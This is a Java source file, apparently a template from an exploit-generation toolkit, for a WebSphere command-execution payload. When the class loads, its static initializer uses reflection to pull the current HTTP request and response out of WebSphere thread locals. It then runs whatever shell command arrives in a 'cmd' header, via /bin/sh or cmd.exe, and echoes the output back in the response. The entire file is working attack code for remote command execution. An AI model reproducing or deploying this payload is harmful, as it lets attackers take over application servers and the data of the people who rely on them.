package jeg.core.template.websphere;

import jeg.core.template.weblogic.WebLogicCodeExecTpl;

import java.io.InputStream;
import java.util.Scanner;

public class WebSphereCmdExecTpl {

    static {
        new WebSphereCmdExecTpl();
    }


    private  String getReqHeaderName() {
        return "cmd";
    }

    public WebSphereCmdExecTpl() {
        run();
    }


    private  void run() {
        try {
            Class clazz = Thread.currentThread().getClass();
            java.lang.reflect.Field field = clazz.getDeclaredField("wsThreadLocals");
            field.setAccessible(true);
            Object obj = field.get(Thread.currentThread());
            Object[] obj_arr = (Object[]) obj;
            for (int i = 0; i < obj_arr.length; i++) {
                Object o = obj_arr[i];
                if (o == null) continue;
                if (o.getClass().getName().endsWith("WebContainerRequestState")) {
                    Object req = o.getClass().getMethod("getCurrentThreadsIExtendedRequest", new Class[0]).invoke(o, new Object[0]);
                    Object resp = o.getClass().getMethod("getCurrentThreadsIExtendedResponse", new Class[0]).invoke(o, new Object[0]);
                    String cmd = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{getReqHeaderName()});
                    if (cmd != null && !cmd.isEmpty()) {
                        String execRes = exec(cmd);
                        java.io.PrintWriter printWriter = (java.io.PrintWriter) resp.getClass().getMethod("getWriter", new Class[0]).invoke(resp, new Object[0]);
                        printWriter.println(execRes);
                    }
                    break;
                }
            }
        } catch (Exception e) {
        }
    }

    private String exec(String cmd) {
        try {
            boolean isLinux = true;
            String osType = System.getProperty("os.name");
            if (osType != null && osType.toLowerCase().contains("win")) {
                isLinux = false;
            }

            String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String execRes = "";
            while (s.hasNext()) {
                execRes += s.next();
            }
            return execRes;
        } catch (Exception e) {
            return e.getMessage();
        }
    }
}
